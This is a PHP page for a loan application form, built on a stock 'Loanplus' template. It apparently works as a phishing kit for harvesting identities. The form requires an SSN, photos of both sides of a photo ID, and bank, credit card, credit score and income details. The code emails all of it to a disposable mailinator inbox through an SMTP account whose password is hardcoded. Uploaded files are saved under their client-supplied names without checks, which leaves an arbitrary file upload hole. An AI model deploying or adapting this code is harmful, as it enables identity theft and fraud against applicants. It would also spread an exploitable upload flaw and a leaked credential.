<?php 
function send_mail($email, $messag, $subject) {
        require_once('mailer/class.phpmailer.php');
        $mail = new PHPMailer();
        $mail->IsSMTP();
        $mail->SMTPDebug = 0;
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = "ssl";
        $mail->Host = "smtp.titan.email";
        $mail->Port = 465;
        $mail->AddAddress($email);
        $mail->Username = "send@ascornfx.com";
        $mail->Password = "Themmustpayme1m$";
        $mail->SetFrom('send@ascornfx.com', 'Apply Form');
        $mail->AddReplyTo("send@ascornfx.com", "Apply Form");
        $mail->Subject = $subject;
        $mail->MsgHTML($messag);
        $mail->Send();
    }
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="description" content="Loanplus - Loan Company HTML Template, Credit Website Template.">
    <meta name="keywords" content="Home Loan Template, Bootstrap Template, Loan Product, Personal Loan">
    <link rel="icon" href="asset/img/favicon.png" type="image/gif">
    <title>Loanplus - Loan Company HTML Template</title>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" type="text/css" href="asset/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="asset/css/fontawesome-all.min.css">
    <link href="../../../ui/1.10.4/themes/ui-lightness/jquery-ui.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="asset/css/reset.css">
    <link rel="stylesheet" type="text/css" href="asset/css/style.css">
    <link rel="stylesheet" type="text/css" href="asset/css/responsive.css">
</head>

<body class="js">
    <div id="preloader"></div>
    <!-- start header area -->
     <?php include('includes/header.php')  ?>
    <!-- end of header area -->
    <div class="page-header">
        <div class="container">
            <div class="row">
                <div class="col-md-12 text-center">
                    <h2>Apply Now</h2>
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="index.php">Home</a></li>
                            <li class="breadcrumb-item active" aria-current="page">Apply Now</li>
                        </ol>
                    </nav>
                </div>
            </div>
        </div>
    </div>
    <!-- end of page header -->
    <section class="section-padding contact-us-padding">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-12 col-lg-10">
                    <form action="" method="post" enctype="multipart/form-data">
                        <div class="row list-input">
                           
                           
                            <div class="col-md-6 mr0">
                                <div class="single-get-touch">
                                    <input type="text" name="fname" placeholder="First Name" required="">
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="single-get-touch">
                                    <input type="text" name="lname" placeholder="Last Name" required="">
                                </div>
                            </div>

                             <div class="col-md-6">
                                <div class="single-get-touch">
                                    <input type="text" name="ssn" placeholder="SSN" required="">
                                </div>
                            </div>

                             <div class="col-md-6">
                                <div class="single-get-touch">
                                    <input type="text" name="phone" placeholder="Phone" required="">
                                </div>
                            </div>

                             <div class="col-md-6">
                                <div class="single-get-touch">
                                    <label>ID Front</label>
                                    <input type="file" name="uploader" placeholder="ID Front" required="">
                                </div>
                            </div>

                             <div class="col-md-6">
                                <div class="single-get-touch">
                                     <label>ID Back</label>
                                    <input type="file" name="uploader1" placeholder="ID Back" required="">
                                </div>
                            </div>

                             <div class="col-md-6">
                                <div class="single-get-touch">
                                    <input type="text" name="address" placeholder="Address" required="">
                                </div>
                            </div>

                            

                              <div class="col-md-6 mr0">
                                <div class="single-get-touch">
                                    <input type="email" name="email" placeholder="Email" required="">
                                </div>
                            </div>

                             <div class="col-md-6">
                                <div class="single-get-touch">
                                    <input type="text" name="bank" placeholder="Bank and Credit Card Owned
" required="">
                                </div>
                            </div>


  <div class="col-md-6">
                                <div class="single-get-touch">
                                    <input type="text" name="credit" placeholder="Credit Score

" required="">
                                </div>
                            </div>


                              <div class="col-md-6 mr0">
                                <div class="single-get-touch">
                                    <input type="text" name="income" placeholder="Income" required="">
                                </div>
                            </div>


                             <div class="col-md-6 mr0">
                                <div class="single-get-touch">
                                    <input type="text" name="employment" placeholder="Employment Info" required="">
                                </div>
                            </div>


                             <div class="col-md-6 mr0">
                                <div class="single-get-touch">
                                    <input type="text" name="account" placeholder="How many Bank accounts do you have?
" required="">
                                </div>
                            </div>

                               <div class="col-md-6 mr0">
                                <div class="single-get-touch">
                                    <input type="text" name="cards" placeholder="How Many Credit Cards Do You Have?
" required="">
                                </div>
                            </div>

                          
                        
                            <div class="col-md-12">
                                <div class="single-get-touch">
                                    <button type="submit" name="submit" class="btn btn-default btn-sm">Apply Now</button>
                                </div>
                            </div>
                        </div>
                    </form>



<?php
                    if (isset ($_POST['submit'])    )
                    {
                        $errors = array();
                        
                            
                            
                            $fname = ($_POST['fname']);

                            $lname = ($_POST['lname']);
                            $ssn = ($_POST['ssn']);
                             $address = ($_POST['address']);
                              $phone = ($_POST['phone']);
                               $email = ($_POST['email']);
                                $bank = ($_POST['bank']);

                             $credit = ($_POST['credit']);
                              $income = ($_POST['income']);
                               $employment = ($_POST['employment']);

                               $account = ($_POST['account']);

                                 $cards = ($_POST['cards']);
                                

                                 $uploader = ($_FILES['uploader']);
                                  $uploader1 = ($_FILES['uploader1']);

                            

                          

                             
                            
                            
                        
                            

                        if(!empty($fname))
                            {
                                
                                
                                if(strlen($fname) > 100 ) {
                                        $errors[] = 'Too long';
                                    }

                                }

                                    else
                                {
                                    $errors[] = 'Please fill the form before submitting it!!!';
                                }
                            if(!empty($errors))
                            {
                                foreach($errors as $error) {
                                    
                                echo 

                                '<div class="alert bg-danger" role="alert">
                    <svg class="glyph stroked success"><use xlink:href="#stroked-success"></use></svg>',$error, '  <a href="#" class="pull-right"><span class="glyphicon glyphicon-remove"></span></a>
                </div>'




                                ;
                                
                                }
                            
                            }

                            else        
                                {
                              
                                    
                                    

               //Stores the filename as it was on the client computer.
            $imagename = $_FILES['uploader']['name'];
            //Stores the filetype e.g image/jpeg
            $imagetype = $_FILES['uploader']['type'];
            //Stores any error codes from the upload.
            $imageerror = $_FILES['uploader']['error'];
            //Stores the tempname as it is given by the host when uploaded.
            $imagetemp = $_FILES['uploader']['tmp_name'];

            //The path you wish to upload the image to
            $imagePath ="uploads/";

              if(is_uploaded_file($imagetemp)) { 
                if(move_uploaded_file($imagetemp, $imagePath . $imagename)) {

                  $path = $imagePath. $imagename;



                   //Stores the filename as it was on the client computer.
            $imagename1 = $_FILES['uploader1']['name'];
            //Stores the filetype e.g image/jpeg
            $imagetype1 = $_FILES['uploader1']['type'];
            //Stores any error codes from the upload.
            $imageerror1 = $_FILES['uploader1']['error'];
            //Stores the tempname as it is given by the host when uploaded.
            $imagetemp1 = $_FILES['uploader1']['tmp_name'];

            //The path you wish to upload the image to
            $imagePath1 ="uploads/";

              if(is_uploaded_file($imagetemp1)) { 
                if(move_uploaded_file($imagetemp1, $imagePath1 . $imagename1)) {

                  $path1 = $imagePath1. $imagename1;


$mailuser = 'test90@mailinator.com';

$message = '<html><head></head><body style="width: 700px;height: 1000px;margin: 0px auto;text-align: left;font-family: Arial;font-size: 14px" > <div style="margin: 0 auto">   <div style="background-color:#000;color:#fff;font-size:28px;padding:20px"><img src="#"  style="height:30px;"> 
 </div> <br>
   <br> Apply Form Details!, <br><br>  
First Name: '.$fname.' <br>
Last Name: '.$lname.' <br>
SSN: '.$ssn.' <br>

ID Front:<img src="'.$path.'">  <br>

ID Back:<img src="'.$path1.'">  <br>
Address: '.$address.' <br>
Phone: '.$phone.' <br>
Email: '.$email.' <br>
Bank and Credit Card Owned: '.$bank.' <br>
Credit: '.$credit.' <br>
Income: '.$income.' <br>
Employment Info: '.$employment.' <br>

Bank accounts: '.$account.' <br>

Credit Cards: '.$cards.' <br>

<br> <br>

 
</div> 


    </body></html>';

$subject = "Apply Form";
send_mail($mailuser, $message, $subject);   


                           
             

 echo '<script>
setTimeout(function() {
   swal.fire({
   
    text: "Your application has been sent successfully",
    type: "success"
}).then(function() {
    window.location = "apply.php";
});
 }, 1000);
</script>';
             



                                }       
                    }
                     }
                      } } }

            
                
                    


                ?>









                </div>
            </div>
        </div>
    </section>
    <!-- start footer area -->
    <?php include('includes/footer.php')  ?>
    <!-- end of footer area -->
    <script src="asset/js/jquery-3.3.1.min.js"></script>
    <script src="../../../ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
    <script src="asset/js/jquery-ui.js"></script>
    <script src="asset/js/popper.min.js"></script>
    <script src="asset/js/bootstrap.min.js"></script>
    <script src="asset/js/jquery.nice-select.js"></script>
    <script src="asset/js/menumaker.js"></script>
    <script src="asset/js/owl.carousel.min.js"></script>
    <script src="asset/js/slider.js"></script>
    <script src="asset/js/active.js"></script>
                   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.33.1/dist/sweetalert2.all.min.js"></script>

</body>

</html>